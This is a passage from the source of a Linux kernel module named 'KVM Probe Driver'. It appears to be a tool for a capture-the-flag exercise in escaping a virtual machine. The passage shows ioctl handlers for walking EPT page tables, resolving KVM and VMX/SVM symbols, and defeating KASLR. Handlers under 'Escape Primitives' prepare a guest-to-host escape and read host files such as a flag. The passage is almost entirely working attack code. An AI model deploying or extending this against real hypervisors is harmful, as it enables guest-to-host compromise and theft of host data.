            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            walk_ept_tables(req.eptp, req.gpa, &req);

            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        case IOCTL_TRANSLATE_GVA: {
            struct gva_translate_request req;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            translate_gva_to_gpa(req.gva, req.cr3, &req);

            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        /* ================================================================
         * Step 5: KVM Structure Discovery
         * ================================================================ */

        case IOCTL_GET_KVM_INFO: {
            struct kvm_vm_info info = {0};

            find_kvm_structures(&info);

            return copy_to_user((void __user *)arg, &info, sizeof(info)) ? -EFAULT : info.status;
        }

        case IOCTL_FIND_KVM_STRUCTURES: {
            struct kvm_vm_info info = {0};

            /* Lookup critical KVM symbols */
            info.kvm_base = lookup_kernel_symbol("kvm_get_kvm");
            info.vcpu_base = lookup_kernel_symbol("vmx_vcpu_run");
            if (!info.vcpu_base) {
                info.vcpu_base = lookup_kernel_symbol("svm_vcpu_run");
            }
            info.vmcs_base = lookup_kernel_symbol("vmcs_read64");
            info.memslots_base = lookup_kernel_symbol("kvm_memslots");
            info.status = 0;

            return copy_to_user((void __user *)arg, &info, sizeof(info)) ? -EFAULT : 0;
        }

        /* ================================================================
         * Step 6: Escape Primitives
         * ================================================================ */

        case IOCTL_PREPARE_ESCAPE: {
            struct escape_state state = {0};

            prepare_escape(&state);

            return copy_to_user((void __user *)arg, &state, sizeof(state)) ? -EFAULT : state.status;
        }

        case IOCTL_CAPTURE_FLAG: {
            struct flag_capture_request req;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            req.flag_path[sizeof(req.flag_path) - 1] = '\0';

            capture_flag(&req);

            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        case IOCTL_READ_HOST_FILE: {
            struct flag_capture_request req;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            req.flag_path[sizeof(req.flag_path) - 1] = '\0';
            req.capture_method = 0;  /* Direct file read */

            capture_flag(&req);

            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        case IOCTL_GET_ESCAPE_STATUS: {
            struct escape_state state = {0};
            state.host_cr3 = read_cr3_local();
            state.status = 0;
            return copy_to_user((void __user *)arg, &state, sizeof(state)) ? -EFAULT : 0;
        }

        default:
            return -EINVAL;
    }

    return 0;
}

/* ========================================================================
 * File Operations
 * ======================================================================== */

static int driver_open(struct inode *inode, struct file *file)
{
    printk(KERN_INFO "%s: Device opened\n", DRIVER_NAME);
    return 0;
}

static int driver_release(struct inode *inode, struct file *file)
{
    printk(KERN_INFO "%s: Device released\n", DRIVER_NAME);
    return 0;
}

static struct file_operations fops = {
    .owner = THIS_MODULE,
    .open = driver_open,
    .release = driver_release,
    .unlocked_ioctl = driver_ioctl,
};

/* ========================================================================
 * Module Initialization
 * ======================================================================== */

static int __init driver_init(void)
{
    int i;

    printk(KERN_INFO "%s: Initializing KVM Probe Driver v3.0\n", DRIVER_NAME);

    /* Initialize kallsyms lookup */
    if (kallsyms_lookup_init() < 0) {
        printk(KERN_WARNING "%s: Failed to init kallsyms lookup\n", DRIVER_NAME);
    }

    /* Initialize KASLR */
    init_kaslr();

    /* Resolve symbol addresses */
    for (i = 0; kvm_symbols[i].name != NULL; i++) {
        kvm_symbols[i].address = lookup_kernel_symbol(kvm_symbols[i].name);
        if (kvm_symbols[i].address) {
            kvm_symbol_count++;
        }
    }
    printk(KERN_INFO "%s: Resolved %u KVM symbols\n", DRIVER_NAME, kvm_symbol_count);

    /* Resolve VMX handlers */
    for (i = 0; vmx_handlers[i].name != NULL; i++) {
        vmx_handlers[i].address = lookup_kernel_symbol(vmx_handlers[i].name);
    }

    /* Resolve SVM handlers */
    for (i = 0; svm_handlers[i].name != NULL; i++) {
        svm_handlers[i].address = lookup_kernel_symbol(svm_handlers[i].name);
    }

    /* Register character device */
    major_num = register_chrdev(0, DEVICE_FILE_NAME, &fops);
    if (major_num < 0) {
        printk(KERN_ERR "%s: Failed to register device: %d\n", DRIVER_NAME, major_num);
        return major_num;
    }

    /* Create device class */
    driver_class = class_create("kvm_probe");
    if (IS_ERR(driver_class)) {
        unregister_chrdev(major_num, DEVICE_FILE_NAME);
        printk(KERN_ERR "%s: Failed to create device class\n", DRIVER_NAME);
        return PTR_ERR(driver_class);
    }

    /* Create device */
    driver_device = device_create(driver_class, NULL, MKDEV(major_num, 0), NULL, DEVICE_FILE_NAME);
    if (IS_ERR(driver_device)) {
        class_destroy(driver_class);
        unregister_chrdev(major_num, DEVICE_FILE_NAME);
        printk(KERN_ERR "%s: Failed to create device\n", DRIVER_NAME);
        return PTR_ERR(driver_device);
    }

    printk(KERN_INFO "%s: Driver initialized - device /dev/%s (major %d)\n",
           DRIVER_NAME, DEVICE_FILE_NAME, major_num);
    printk(KERN_INFO "%s: KASLR slide: 0x%lx, Kernel base: 0x%lx\n",
           DRIVER_NAME, g_kaslr_slide, g_kernel_text_base);

    return 0;
}

static void __exit driver_exit(void)
{
    device_destroy(driver_class, MKDEV(major_num, 0));
    class_destroy(driver_class);
    unregister_chrdev(major_num, DEVICE_FILE_NAME);
    printk(KERN_INFO "%s: Driver unloaded\n", DRIVER_NAME);
}

module_init(driver_init);
module_exit(driver_exit);
